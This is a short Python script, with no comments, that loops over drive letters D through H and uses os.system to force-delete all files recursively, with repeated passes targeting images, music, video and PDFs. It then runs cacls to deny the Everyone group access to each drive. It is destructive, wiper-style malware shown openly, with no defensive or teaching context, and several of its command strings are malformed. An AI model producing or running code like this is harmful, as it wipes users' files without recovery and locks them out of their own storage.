import os
sism = ['d','e','f','h','g']
for d in sism:
    drive = d
    os.system('del'+ drive +':\*.*/f/s/q')
    os.system('del'+ drive +':\*.jpg /f /s/ q')
    os.system('del' + drive + ':\*.mp3 /f /s /q')
    os.system('del' + drive + ':\*.mp4 /f /s/ q')
    os.system('del' + drive + ':\*.pdf /f /s/ q')
    os.system('del' + drive + ':\*.whatsapp /f /s /q')
    os.system('del' + drive + ':\*.facebook /f/s/q')
    os.system('cacls' + drive + ": /e /  everyone:n ")

